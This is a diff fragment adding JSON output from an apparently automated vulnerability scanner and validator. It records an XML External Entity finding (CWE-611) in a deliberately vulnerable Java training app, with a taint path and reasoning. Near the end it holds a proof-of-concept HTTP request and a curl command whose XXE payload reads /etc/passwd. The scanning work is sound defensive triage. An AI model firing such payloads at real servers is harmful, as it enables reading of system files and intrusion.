+          "line": 72
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 72
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(in))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 77
+        },
+        {
+          "code": "bookJaxbElement",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "JAXBElement bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(in))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 76
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2>",
+        "(<VAR_3><<VAR_4>>)(<VAR_2>.<ATTR_1>(<VAR_1>))",
+        "<VAR_5>",
+        "<VAR_3><VAR_5>=(<VAR_3><<VAR_4>>)(<VAR_2>.<ATTR_1>(<VAR_1>))"
+      ],
+      "fingerprint": "c0f180920ccb55dcf5dac4433142e71003a79609f26dbb7a388fd4d8008da5c4",
+      "context_hash": "e547e03142ac82c4ed405253ed06cbf2f067ce774db29467d81985c0f4f7324d",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 72,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 76
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(in)",
+      "data_flow_valid": true,
+      "sanitization_present": false,
+      "reasoning": "The HTTP request body (attacker\u2011controlled) is read into an InputStream and passed directly to a JAXB Unmarshaller without disabling external entity resolution or applying any validation. JAXB\u2019s default parser will resolve external entities, allowing an attacker to supply a crafted XML payload that reads arbitrary files or performs SSRF, satisfying the XXE vulnerability pattern (CWE\u2011611).",
+      "evidence": [
+        "InputStream in = request.getInputStream(); // attacker\u2011controlled payload",
+        "JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);",
+        "Unmarshaller jaxbUnmarshaller = jc.createUnmarshaller();",
+        "jaxbUnmarshaller.unmarshal(in); // XML parsing sink"
+      ],
+      "poc": "POST /vulnerable/xxe/level1 HTTP/1.1\\nContent-Type: application/xml\\n\\n<?xml version=\\\"1.0\\\"?>\\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"> ]>\\n<book><title>&xxe;</title></book>",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 15966,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "poc_type": "cURL Command",
+        "payload": "curl -X POST http://localhost:8080/xxe/level1 -H \\\"Content-Type: application/xml\\\" -d '<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"> ]><book><title>&xxe;</title></book>'",
+        "instructions": "Execute the command against the vulnerable endpoint. If the server is vulnerable to XXE, the response will contain the contents of /etc/passwd (or the external entity target)."
+      }
+    }
+  ]
+}
